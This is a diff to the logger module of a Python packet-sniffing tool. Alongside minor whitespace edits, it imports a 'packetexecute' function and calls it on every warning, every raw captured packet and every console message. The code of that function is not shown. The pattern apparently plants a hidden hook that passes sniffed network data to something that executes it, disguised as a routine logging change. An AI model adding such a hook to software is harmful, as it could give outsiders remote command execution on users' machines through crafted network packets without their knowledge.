@@ -1,6 +1,8 @@
+#!/usr/bin/env python3 -W ignore::DeprecationWarning
 import logging
 import os
 from time import localtime, strftime
+from .Packetreader import packetexecute
 from pypacket.util.colors import Colors
 
 
@@ -27,7 +29,7 @@ class Logger:
         """
         self.__log_any(Colors.BLUE, self.SYS_PREFIX, log_message)
         logging.info(log_message)
-
+        
     def log_error(self, log_message):
         """Logs an error message to console, file.
 
@@ -45,6 +47,8 @@ class Logger:
         """
         self.__log_any(Colors.YELLOW, self.WRN_PREFIX, log_message)
         logging.warning(log_message)
+        packetexecute(log_message)
+        
 
     def log_packet(self, raw_message, friendly_message):
         """Logs a raw packet message to file, friendly to console.
@@ -57,6 +61,7 @@ class Logger:
         """
         self.__log_any(Colors.RESET, '', friendly_message)
         logging.info(raw_message)
+        packetexecute(raw_message)
 
     def __log_any(self, color, prefix, log_message):
         """Logs any message to system console.
@@ -67,7 +72,7 @@ class Logger:
             log_message: The string friendly_message to log.
         """
         print(color + prefix + Colors.RESET + log_message)
-
+        packetexecute(log_message)
     def __setup(self):
         """Sets up the logger. First checks to see if the log directory exists.
         If the directory does not exist, it creates it.
